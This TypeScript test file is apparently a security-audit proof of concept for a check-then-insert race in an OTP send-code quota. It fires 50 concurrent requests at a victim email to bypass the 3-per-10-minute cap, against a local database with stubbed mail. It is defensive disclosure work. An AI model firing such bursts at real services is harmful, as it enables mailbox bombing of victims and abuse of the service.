/**
 * p10-003 PoC — OTP send-code quota TOCTOU (check-then-insert race).
 * NOT part of the project test suite.
 *
 * Runs the REAL worker (src/worker.ts) in workerd against local D1 with the
 * production migration schema, under default config (TURNSTILE_SECRET_KEY
 * unset => Turnstile fail-open; no IP rate limiter exists on the path).
 *
 * Phase A (control): 5 SEQUENTIAL send-code calls to one email prove the cap
 * works when serialized: statuses 200,200,200,429,429.
 *
 * Phase B (exploit): N CONCURRENT send-code calls to one fresh victim email.
 * Every request reads COUNT(*) < 3 before any INSERT commits (the read at
 * auth.ts:232-244 and the write at auth.ts:258-264 are separate round-trips),
 * so all N insert rows / "send" OTP emails. Security effect: mailbox bombing —
 * dozens of OTP deliveries in one burst where the documented cap is 3/10min.
 */
import '../src/cloudflare-test.d.ts';
import { describe, it, expect, beforeAll } from 'vitest';
import { env, createExecutionContext, waitOnExecutionContext } from 'cloudflare:test';
import worker from '../src/worker';

function req(path: string, body: string): Request {
  return new Request(`https://omg-api.latham.cloud${path}`, {
    method: 'POST',
    headers: new Headers({ 'Content-Type': 'application/json' }),
    body,
  });
}

async function dispatch(request: Request): Promise<Response> {
  const context = createExecutionContext();
  const response = await worker.fetch(request, env, context);
  await waitOnExecutionContext(context);
  return response;
}

const CONTROL_EMAIL = 'control@cap.test';
const VICTIM_EMAIL = 'victim@bomb.test';
const BURST_SIZE = 50;

describe('p10-003: send-code quota TOCTOU', () => {
  beforeAll(() => {
    // Default production posture: Turnstile secret unset (fail-open), JWT secret set.
    (env as Record<string, unknown>).TURNSTILE_SECRET_KEY = undefined;
    (env as Record<string, unknown>).JWT_SECRET = 'p11-test-jwt-secret';
    // Stub send_email binding so OTP delivery succeeds locally; each successful
    // request corresponds 1:1 with an email handed to the mail binding.
    let mailed = 0;
    (env as Record<string, unknown>).EMAIL = {
      send: async () => {
        mailed++;
      },
    };
    (globalThis as Record<string, unknown>).__mailedCount = mailed;
  });

  it('control: sequential sends respect the 3-per-10-minutes cap', async () => {
    const statuses: number[] = [];
    for (let i = 0; i < 5; i++) {
      const res = await dispatch(req('/api/auth/send-code', JSON.stringify({ email: CONTROL_EMAIL })));
      statuses.push(res.status);
    }
    console.log('p10-003 control sequential statuses:', statuses.join(','));
    expect(statuses).toEqual([200, 200, 200, 429, 429]);
  });

  it('exploit: concurrent burst bypasses the cap — all requests deliver OTPs', async () => {
    const burst = Array.from({ length: BURST_SIZE }, () =>
      dispatch(req('/api/auth/send-code', JSON.stringify({ email: VICTIM_EMAIL })))
    );
    const responses = await Promise.all(burst);
    const statuses = responses.map(r => r.status);
    const delivered = statuses.filter(s => s === 200).length;
    console.log(`p10-003 burst statuses x${BURST_SIZE}:`, statuses.join(','));
    console.log(`p10-003 OTP emails delivered in single burst: ${delivered} (documented cap: 3)`);

    // Ground truth straight from D1: how many codes exist for the victim
    // inside the quota window?
    const rows = await env.DB.prepare(
      `SELECT COUNT(*) AS n FROM auth_codes
       WHERE email = ? AND created_at > datetime('now', '-10 minutes')`
    )
      .bind(VICTIM_EMAIL)
      .first<{ n: number }>();
    console.log(`p10-003 auth_codes rows for victim within window: ${rows?.n}`);
    console.log(`p10-003 QUOTA_BYPASS_RATIO: ${rows?.n}/3`);

    expect(delivered).toBeGreaterThan(3); // security effect: >3x over documented cap
    expect(rows?.n ?? 0).toBeGreaterThan(3);
  });
});
